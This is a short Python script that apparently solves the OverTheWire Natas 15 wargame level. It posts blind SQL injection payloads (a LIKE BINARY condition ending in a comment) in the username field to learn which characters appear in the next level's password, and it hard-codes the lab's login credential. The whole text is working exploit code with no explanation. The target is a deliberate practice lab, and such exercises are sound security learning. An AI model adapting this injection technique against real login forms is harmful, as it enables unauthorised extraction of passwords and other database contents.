import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    if 'exists' in r.text :
        filtered = filtered + char

print(filtered)